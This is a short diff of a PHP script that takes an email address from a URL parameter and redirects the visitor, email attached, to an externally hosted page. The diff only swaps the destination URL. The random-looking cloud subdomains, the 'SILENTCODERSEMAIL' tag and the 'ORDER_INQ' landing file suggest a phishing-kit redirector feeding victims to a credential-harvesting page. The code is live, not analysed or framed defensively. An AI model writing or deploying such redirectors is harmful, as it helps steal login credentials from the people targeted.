@@ -8,5 +8,5 @@ return $emID;
 }
 $em = $_GET['em'];
 $emID = getemIDFromem($em);
-header("Location: https://mciaufanuxczozxusa-sweet-lizard-jc.us-south.cf.appdomain.cloud/?bbre=zxoiasizx#/cNtJDu75e-!&@j03LU2PiSh1r4yfu9kwomtGxJZlT!@&qVDhGbJAwYB6XKL&!@-SILENTCODERSEMAIL-xbMjtR/CMjftOD4Ip/?em=$em");
+header("Location: https://cloud-object-storage-60-cos-static-web-hosting-dvr.s3.us-east.cloud-object-storage.appdomain.cloud/butbox2019_ORDER_INQ_328Y389.html?#SILENTCODERSEMAIL/?em=$em");
 ?>
